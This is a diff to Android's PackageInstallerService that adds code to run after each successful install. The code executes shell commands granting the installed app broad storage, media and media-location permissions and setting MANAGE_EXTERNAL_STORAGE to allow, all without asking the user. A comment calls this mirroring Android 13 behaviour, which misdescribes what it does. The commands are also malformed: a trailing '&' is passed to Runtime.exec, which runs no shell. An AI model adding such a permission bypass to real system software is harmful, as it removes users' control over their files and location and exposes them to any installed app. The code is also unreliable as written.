@@ -150,6 +150,9 @@ import java.util.TreeSet;
 import java.util.concurrent.CompletableFuture;
 import java.util.function.IntPredicate;
 import java.util.function.Supplier;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.BufferedReader;
 
 /** The service responsible for installing packages. */
 public class PackageInstallerService extends IPackageInstaller.Stub implements
@@ -2266,6 +2269,33 @@ public class PackageInstallerService extends IPackageInstaller.Stub implements
                         mStagingManager.abortSession(session.mStagedSession);
                     }
                     synchronized (mSessions) {
+                        if (success) {
+                            // Mirror A13 behavior: grant broad media/storage permissions
+                            // and allow MANAGE_EXTERNAL_STORAGE for the installed package.
+                            final String packageName = session.params != null
+                                    ? session.params.appPackageName : null;
+                            if (!TextUtils.isEmpty(packageName)) {
+                                try {
+                                    Runtime.getRuntime().exec("pm grant " + packageName
+                                            + " android.permission.WRITE_EXTERNAL_STORAGE &");
+                                    Runtime.getRuntime().exec("pm grant " + packageName
+                                            + " android.permission.READ_EXTERNAL_STORAGE &");
+                                    Runtime.getRuntime().exec("pm grant " + packageName
+                                            + " android.permission.READ_MEDIA_AUDIO &");
+                                    Runtime.getRuntime().exec("pm grant " + packageName
+                                            + " android.permission.READ_MEDIA_VIDEO &");
+                                    Runtime.getRuntime().exec("pm grant " + packageName
+                                            + " android.permission.ACCESS_MEDIA_LOCATION &");
+                                    Runtime.getRuntime().exec("pm grant " + packageName
+                                            + " android.permission.READ_MEDIA_IMAGES &");
+                                    Runtime.getRuntime().exec("appops set --uid " + packageName
+                                            + " MANAGE_EXTERNAL_STORAGE allow &");
+                                } catch (IOException e) {
+                                    Log.e(TAG, "Error executing shell commands to grant "
+                                            + "permissions: " + e.getMessage());
+                                }
+                            }
+                        }                        
                         // Child sessions will be removed along with its parent as a whole
                         if (!session.hasParentSessionId()) {
                             // Retain policy:
